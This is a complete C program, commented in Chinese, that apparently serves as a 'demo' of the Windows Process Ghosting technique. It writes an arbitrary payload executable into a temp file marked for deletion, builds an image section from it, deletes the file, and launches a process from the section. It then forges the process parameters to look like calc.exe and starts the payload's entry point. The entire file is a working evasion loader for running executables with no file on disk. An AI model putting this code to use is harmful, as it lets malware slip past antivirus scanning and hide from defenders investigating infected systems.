#include <windows.h>
#include <stdio.h>
#include <userenv.h>
#include "internals.h"
#include "pe_utils.h"

#pragma comment(lib, "ntdll.lib")
#pragma comment(lib, "userenv.lib")

// ===== 全局函数指针定义 =====
// NtOpenFile, NtSetInformationFile 使用系统声明
_NtWriteFile NtWriteFile = NULL;
_NtCreateSection NtCreateSection = NULL;
_NtCreateProcessEx NtCreateProcessEx = NULL;
_NtCreateThreadEx NtCreateThreadEx = NULL;
_NtReadVirtualMemory NtReadVirtualMemory = NULL;
_RtlCreateProcessParametersEx RtlCreateProcessParametersEx = NULL;

/**
 * 初始化 NT API 函数指针
 */
BOOL InitializeNtFunctions() {
    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    if (!hNtdll) {
        printf("错误：无法获取 ntdll.dll 句柄\n");
        return FALSE;
    }

    // NtOpenFile, NtSetInformationFile 使用系统提供的声明
    NtWriteFile = (_NtWriteFile)GetProcAddress(hNtdll, "NtWriteFile");
    NtCreateSection = (_NtCreateSection)GetProcAddress(hNtdll, "NtCreateSection");
    NtCreateProcessEx = (_NtCreateProcessEx)GetProcAddress(hNtdll, "NtCreateProcessEx");
    NtCreateThreadEx = (_NtCreateThreadEx)GetProcAddress(hNtdll, "NtCreateThreadEx");
    NtReadVirtualMemory = (_NtReadVirtualMemory)GetProcAddress(hNtdll, "NtReadVirtualMemory");
    RtlCreateProcessParametersEx = (_RtlCreateProcessParametersEx)GetProcAddress(hNtdll, "RtlCreateProcessParametersEx");

    if (!NtWriteFile || !NtCreateSection || !NtCreateProcessEx ||
        !NtCreateThreadEx || !NtReadVirtualMemory || !RtlCreateProcessParametersEx) {
        printf("错误：无法获取 NT API 函数地址\n");
        return FALSE;
    }

    return TRUE;
}

/**
 * 打开文件（使用 NtOpenFile）
 */
HANDLE OpenFileForGhosting(const WCHAR* filePath) {
    // 转换为 NT 路径格式
    WCHAR ntPath[MAX_PATH + 10];
    swprintf(ntPath, MAX_PATH + 10, L"\\??\\%ls", filePath);

    UNICODE_STRING fileName;
    RtlInitUnicodeString(&fileName, ntPath);

    OBJECT_ATTRIBUTES objAttr;
    InitializeObjectAttributes(&objAttr, &fileName, OBJ_CASE_INSENSITIVE, NULL, NULL);

    IO_STATUS_BLOCK statusBlock = {0};
    HANDLE hFile = INVALID_HANDLE_VALUE;

    NTSTATUS status = NtOpenFile(
        &hFile,
        DELETE | SYNCHRONIZE | GENERIC_READ | GENERIC_WRITE,
        &objAttr,
        &statusBlock,
        FILE_SHARE_READ | FILE_SHARE_WRITE,
        FILE_SUPERSEDE | FILE_SYNCHRONOUS_IO_NONALERT
    );

    if (!NT_SUCCESS(status)) {
        printf("错误：NtOpenFile 失败，状态码：0x%lX\n", status);
        return INVALID_HANDLE_VALUE;
    }

    return hFile;
}

/**
 * 从删除待处理的文件创建内存节
 */
HANDLE CreateSectionFromDeletePendingFile(BYTE* payloadBuf, DWORD payloadSize) {
    printf("\n[1] 创建临时文件\n");

    // 获取临时文件路径
    WCHAR tempPath[MAX_PATH];
    WCHAR dummyName[MAX_PATH];
    GetTempPathW(MAX_PATH, tempPath);
    GetTempFileNameW(tempPath, L"GH", 0, dummyName);

    printf("    临时文件：%ls\n", dummyName);

    // 打开文件
    printf("\n[2] 打开文件（带 DELETE 权限）\n");
    HANDLE hFile = OpenFileForGhosting(dummyName);
    if (hFile == INVALID_HANDLE_VALUE) {
        return INVALID_HANDLE_VALUE;
    }
    printf("    文件已打开\n");

    // 设置文件为删除待处理状态（关键步骤！）
    printf("\n[3] 设置文件为删除待处理状态\n");
    IO_STATUS_BLOCK statusBlock = {0};
    FILE_DISPOSITION_INFORMATION dispInfo = {0};
    dispInfo.DoDeleteFile = TRUE;

    NTSTATUS status = NtSetInformationFile(
        hFile,
        &statusBlock,
        &dispInfo,
        sizeof(dispInfo),
        FileDispositionInformation
    );

    if (!NT_SUCCESS(status)) {
        printf("错误：设置删除待处理状态失败，状态码：0x%lX\n", status);
        NtClose(hFile);
        return INVALID_HANDLE_VALUE;
    }
    printf("    文件已标记为删除待处理\n");
    printf("    关键：文件将在句柄关闭时被删除！\n");

    // 写入载荷到文件
    printf("\n[4] 写入载荷到删除待处理的文件\n");
    LARGE_INTEGER byteOffset = {0};

    status = NtWriteFile(
        hFile,
        NULL,
        NULL,
        NULL,
        &statusBlock,
        payloadBuf,
        payloadSize,
        &byteOffset,
        NULL
    );

    if (!NT_SUCCESS(status)) {
        printf("错误：写入文件失败，状态码：0x%lX\n", status);
        NtClose(hFile);
        return INVALID_HANDLE_VALUE;
    }
    printf("    载荷大小：%d 字节\n", payloadSize);
    printf("    已写入载荷\n");

    // 从文件创建镜像节
    printf("\n[5] 从删除待处理的文件创建镜像节\n");
    HANDLE hSection = NULL;
    status = NtCreateSection(
        &hSection,
        SECTION_ALL_ACCESS,
        NULL,
        0,
        PAGE_READONLY,
        SEC_IMAGE,
        hFile
    );

    if (status != STATUS_SUCCESS) {
        printf("错误：NtCreateSection 失败，状态码：0x%lX\n", status);
        NtClose(hFile);
        return INVALID_HANDLE_VALUE;
    }
    printf("    节句柄：0x%p\n", hSection);
    printf("    关键：镜像节已从删除待处理的文件创建！\n");

    // 关闭文件句柄 - 文件将被删除
    printf("\n[6] 关闭文件句柄\n");
    NtClose(hFile);
    printf("    文件句柄已关闭\n");
    printf("    ★ 文件已被删除！\n");
    printf("    ★ 但镜像节仍然存在且可用！\n");

    return hSection;
}

/**
 * 设置进程参数
 */
BOOL SetupProcessParameters(HANDLE hProcess, PROCESS_BASIC_INFORMATION* pbi, const WCHAR* targetPath) {
    printf("\n[9] 设置进程参数\n");

    // 1. 初始化 UNICODE_STRING
    UNICODE_STRING uImagePath;
    RtlInitUnicodeString(&uImagePath, targetPath);

    WCHAR dllDir[] = L"C:\\Windows\\System32";
    UNICODE_STRING uDllPath;
    RtlInitUnicodeString(&uDllPath, dllDir);

    WCHAR currentDir[MAX_PATH];
    GetCurrentDirectoryW(MAX_PATH, currentDir);
    UNICODE_STRING uCurrentDir;
    RtlInitUnicodeString(&uCurrentDir, currentDir);

    WCHAR windowName[] = L"Process Ghosting Demo";
    UNICODE_STRING uWindowName;
    RtlInitUnicodeString(&uWindowName, windowName);

    // 2. 创建环境块
    PVOID environment = NULL;
    CreateEnvironmentBlock(&environment, NULL, TRUE);

    // 3. 创建进程参数
    PMY_RTL_USER_PROCESS_PARAMETERS params = NULL;
    NTSTATUS status = RtlCreateProcessParametersEx(
        &params,
        &uImagePath,
        &uDllPath,
        &uCurrentDir,
        &uImagePath,
        environment,
        &uWindowName,
        NULL,
        NULL,
        NULL,
        RTL_USER_PROC_PARAMS_NORMALIZED
    );

    if (status != STATUS_SUCCESS) {
        printf("错误：RtlCreateProcessParametersEx 失败，状态码：0x%lX\n", status);
        if (environment) DestroyEnvironmentBlock(environment);
        return FALSE;
    }

    // 4. 在远程进程中分配内存并写入参数
    SIZE_T paramsSize = params->Length;

    if (!VirtualAllocEx(hProcess, params, paramsSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE)) {
        printf("错误：在远程进程分配参数内存失败\n");
        if (environment) DestroyEnvironmentBlock(environment);
        return FALSE;
    }

    if (!WriteProcessMemory(hProcess, params, params, paramsSize, NULL)) {
        printf("错误：写入进程参数失败\n");
        if (environment) DestroyEnvironmentBlock(environment);
        return FALSE;
    }

    // 5. 写入环境变量
    if (params->Environment) {
        if (!VirtualAllocEx(hProcess, params->Environment, params->EnvironmentSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE)) {
            printf("警告：分配环境变量内存失败\n");
        } else {
            WriteProcessMemory(hProcess, params->Environment, params->Environment, params->EnvironmentSize, NULL);
        }
    }

    // 6. 更新 PEB 中的 ProcessParameters 指针
    MY_PEB peb = {0};
    SIZE_T bytesRead = 0;

    status = NtReadVirtualMemory(hProcess, pbi->PebBaseAddress, &peb, sizeof(MY_PEB), &bytesRead);
    if (status != STATUS_SUCCESS) {
        printf("错误：读取远程 PEB 失败\n");
        if (environment) DestroyEnvironmentBlock(environment);
        return FALSE;
    }

    // 计算 ProcessParameters 字段的偏移
    ULONG_PTR offset = (ULONG_PTR)&peb.ProcessParameters - (ULONG_PTR)&peb;
    PVOID remoteParamsAddr = (PVOID)((ULONG_PTR)pbi->PebBaseAddress + offset);

    if (!WriteProcessMemory(hProcess, remoteParamsAddr, &params, sizeof(PVOID), NULL)) {
        printf("错误：更新 PEB ProcessParameters 失败\n");
        if (environment) DestroyEnvironmentBlock(environment);
        return FALSE;
    }

    if (environment) DestroyEnvironmentBlock(environment);

    printf("    进程参数已设置\n");
    return TRUE;
}

/**
 * 主函数：进程幽灵（Process Ghosting）
 */
int wmain(int argc, WCHAR* argv[]) {
    printf("======================================\n");
    printf("     Process Ghosting 演示程序\n");
    printf("======================================\n");

    if (argc < 2) {
        printf("\n用法：%ls <载荷路径> [目标路径]\n", argv[0]);
        printf("\n示例：\n");
        printf("  %ls payload.exe\n", argv[0]);
        printf("  %ls payload.exe C:\\\\Windows\\\\System32\\\\calc.exe\n", argv[0]);
        printf("\n说明：\n");
        printf("  载荷路径：要执行的 PE 文件\n");
        printf("  目标路径：可选，用于进程参数\n");
        return 1;
    }

    // 初始化函数指针
    if (!InitializeNtFunctions()) {
        return 1;
    }

    const WCHAR* payloadPath = argv[1];
    WCHAR targetPath[MAX_PATH] = {0};

    if (argc >= 3) {
        wcscpy_s(targetPath, MAX_PATH, argv[2]);
    } else {
        #ifdef _WIN64
            wcscpy_s(targetPath, MAX_PATH, L"C:\\Windows\\System32\\calc.exe");
        #else
            wcscpy_s(targetPath, MAX_PATH, L"C:\\Windows\\SysWOW64\\calc.exe");
        #endif
    }

    printf("\n========== 开始 Process Ghosting ==========\n");
    printf("载荷文件：%ls\n", payloadPath);
    printf("目标路径：%ls\n", targetPath);

    // 读取载荷
    printf("\n[0] 读取载荷文件\n");
    DWORD payloadSize = 0;
    BYTE* payloadBuf = ReadFileToBuffer(payloadPath, &payloadSize);
    if (!payloadBuf) {
        return 1;
    }

    BOOL isPayload64 = IsPE64Bit(payloadBuf);
    printf("    载荷架构：%s\n", isPayload64 ? "64 位" : "32 位");

    // 从删除待处理的文件创建镜像节
    HANDLE hSection = CreateSectionFromDeletePendingFile(payloadBuf, payloadSize);
    if (hSection == INVALID_HANDLE_VALUE) {
        free(payloadBuf);
        return 1;
    }

    // 从内存节创建进程
    printf("\n[7] 从内存节创建进程（NtCreateProcessEx）\n");

    HANDLE hProcess = NULL;
    NTSTATUS status = NtCreateProcessEx(
        &hProcess,
        PROCESS_ALL_ACCESS,
        NULL,
        GetCurrentProcess(),
        PS_INHERIT_HANDLES,
        hSection,
        NULL,
        NULL,
        FALSE
    );

    if (status != STATUS_SUCCESS) {
        printf("错误：NtCreateProcessEx 失败，状态码：0x%lX\n", status);
        if (status == STATUS_IMAGE_MACHINE_TYPE_MISMATCH) {
            printf("提示：载荷架构不匹配（32/64 位）\n");
        }
        CloseHandle(hSection);
        free(payloadBuf);
        return 1;
    }

    DWORD processId = GetProcessId(hProcess);
    printf("    进程已创建！\n");
    printf("    进程 ID：%d\n", processId);
    printf("    进程句柄：0x%p\n", hProcess);

    // 查询进程信息
    printf("\n[8] 查询进程基本信息\n");

    PROCESS_BASIC_INFORMATION pbi = {0};
    ULONG returnLength = 0;

    status = NtQueryInformationProcess(
        hProcess,
        ProcessBasicInformation,
        &pbi,
        sizeof(pbi),
        &returnLength
    );

    if (status != STATUS_SUCCESS) {
        printf("错误：NtQueryInformationProcess 失败，状态码：0x%lX\n", status);
        TerminateProcess(hProcess, 1);
        CloseHandle(hSection);
        free(payloadBuf);
        return 1;
    }

    printf("    PEB 地址：0x%p\n", pbi.PebBaseAddress);

    // 读取 PEB 获取 ImageBase
    MY_PEB peb = {0};
    SIZE_T bytesRead = 0;
    status = NtReadVirtualMemory(hProcess, pbi.PebBaseAddress, &peb, sizeof(MY_PEB), &bytesRead);
    if (status != STATUS_SUCCESS) {
        printf("错误：读取 PEB 失败\n");
        TerminateProcess(hProcess, 1);
        CloseHandle(hSection);
        free(payloadBuf);
        return 1;
    }

    printf("    镜像基址：0x%p\n", peb.ImageBaseAddress);

    // 设置进程参数
    if (!SetupProcessParameters(hProcess, &pbi, targetPath)) {
        printf("警告：设置进程参数失败，继续执行\n");
    }

    // 计算入口点
    printf("\n[10] 创建线程执行入口点\n");

    DWORD entryRVA = GetEntryPointRVA(payloadBuf);
    ULONG_PTR entryPoint = (ULONG_PTR)peb.ImageBaseAddress + entryRVA;

    printf("    入口点 RVA：0x%X\n", entryRVA);
    printf("    入口点 VA：0x%p\n", (PVOID)entryPoint);

    // 创建线程
    HANDLE hThread = NULL;
    status = NtCreateThreadEx(
        &hThread,
        THREAD_ALL_ACCESS,
        NULL,
        hProcess,
        (LPTHREAD_START_ROUTINE)entryPoint,
        NULL,
        FALSE,
        0,
        0,
        0,
        NULL
    );

    if (status != STATUS_SUCCESS) {
        printf("错误：NtCreateThreadEx 失败，状态码：0x%lX\n", status);
        TerminateProcess(hProcess, 1);
        CloseHandle(hSection);
        free(payloadBuf);
        return 1;
    }

    printf("    线程已创建！\n");
    printf("    线程 ID：%d\n", GetThreadId(hThread));

    printf("\n========== Process Ghosting 完成 ==========\n");
    printf("进程 %d 正在运行载荷代码\n", processId);
    printf("\n技术特点：\n");
    printf("  • 文件在创建镜像节前被标记为删除待处理\n");
    printf("  • 文件句柄关闭后文件被删除\n");
    printf("  • 进程从已删除的文件的镜像节创建\n");
    printf("  • GetProcessImageFileName 返回空字符串\n");
    printf("  • 不依赖 NTFS 事务，比 Doppelgänging 更简单\n");

    // 清理
    CloseHandle(hThread);
    CloseHandle(hSection);
    free(payloadBuf);
    CloseHandle(hProcess);

    return 0;
}
